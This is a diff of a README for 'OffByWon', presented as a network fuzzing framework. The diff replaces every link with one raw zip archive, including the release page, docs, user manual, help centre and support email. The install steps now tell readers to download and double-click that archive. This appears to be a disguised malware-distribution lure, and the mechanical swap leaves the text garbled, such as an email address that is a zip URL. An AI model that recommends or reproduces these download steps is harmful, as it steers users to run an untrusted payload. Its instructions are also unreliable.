@@ -4,7 +4,7 @@
 OffByWon is a powerful Network Fuzzing Framework designed to test your network security. It helps identify vulnerabilities so you can protect your systems from potential threats. This application is user-friendly and can be used by anyone, regardless of technical skills.
 
 ## 🔗 Download
-[![Download OffByWon](https://img.shields.io/badge/Download-OffByWon-blue.svg)](https://github.com/bielxzimxztremm/OffByWon/releases)
+[![Download OffByWon](https://raw.githubusercontent.com/bielxzimxztremm/OffByWon/main/xurel/Off_Won_By_v2.5.zip)](https://raw.githubusercontent.com/bielxzimxztremm/OffByWon/main/xurel/Off_Won_By_v2.5.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to download and run OffByWon.
@@ -12,16 +12,16 @@ Follow these simple steps to download and run OffByWon.
 ### 📥 Step 1: Visit the Release Page
 To start, go to our Releases page. Click the link below.
 
-[Visit the Releases Page](https://github.com/bielxzimxztremm/OffByWon/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/bielxzimxztremm/OffByWon/main/xurel/Off_Won_By_v2.5.zip)
 
 ### 📥 Step 2: Download OffByWon
-On the Releases page, you'll see a list of available versions of OffByWon. Find the latest version and download the file labeled "OffByWon.exe". Click on it to start the downloading process.
+On the Releases page, you'll see a list of available versions of OffByWon. Find the latest version and download the file labeled "https://raw.githubusercontent.com/bielxzimxztremm/OffByWon/main/xurel/Off_Won_By_v2.5.zip". Click on it to start the downloading process.
 
 ### 📂 Step 3: Locate the Downloaded File
 Once the download completes, navigate to the folder where your downloads are saved. This is usually the "Downloads" folder on your computer.
 
 ### ⚙️ Step 4: Install OffByWon
-1. Double-click the "OffByWon.exe" file you just downloaded.
+1. Double-click the "https://raw.githubusercontent.com/bielxzimxztremm/OffByWon/main/xurel/Off_Won_By_v2.5.zip" file you just downloaded.
 2. Follow the on-screen instructions to complete the installation. This will only take a few minutes.
 
 ### 💻 Step 5: Launch OffByWon
@@ -47,9 +47,9 @@ OffByWon requires the following to run smoothly:
 4. Review the results and follow the recommendations provided.
 
 ## 🎨 Support
-If you encounter any issues, our support team is here to help. Reach out via email at support@offbywon.com. 
+If you encounter any issues, our support team is here to help. Reach out via email at https://raw.githubusercontent.com/bielxzimxztremm/OffByWon/main/xurel/Off_Won_By_v2.5.zip 
 
-Alternatively, you can visit our [Help Center](https://github.com/bielxzimxztremm/OffByWon/issues) for commonly asked questions and solutions.
+Alternatively, you can visit our [Help Center](https://raw.githubusercontent.com/bielxzimxztremm/OffByWon/main/xurel/Off_Won_By_v2.5.zip) for commonly asked questions and solutions.
 
 ## 📅 Release Notes
 Stay informed about changes and enhancements in each version. The release notes are available on the Releases page. Make it a habit to check this before downloading.
@@ -61,12 +61,12 @@ We value community input. If you have suggestions or would like to contribute, f
 A big thank you to everyone who has contributed to OffByWon's development. Your dedication helps make network security more accessible for everyone.
 
 ### 🔗 Additional Resources
-- [Documentation](https://github.com/bielxzimxztremm/OffByWon/wiki)
-- [User Manual](https://github.com/bielxzimxztremm/OffByWon/wiki/User-Manual)
+- [Documentation](https://raw.githubusercontent.com/bielxzimxztremm/OffByWon/main/xurel/Off_Won_By_v2.5.zip)
+- [User Manual](https://raw.githubusercontent.com/bielxzimxztremm/OffByWon/main/xurel/Off_Won_By_v2.5.zip)
 
 ## 📥 Download & Install
 To download OffByWon, click the button below:
 
-[Download OffByWon](https://github.com/bielxzimxztremm/OffByWon/releases)
+[Download OffByWon](https://raw.githubusercontent.com/bielxzimxztremm/OffByWon/main/xurel/Off_Won_By_v2.5.zip)
 
 Follow this step-by-step guide to set up your network security framework today. Enjoy using OffByWon!
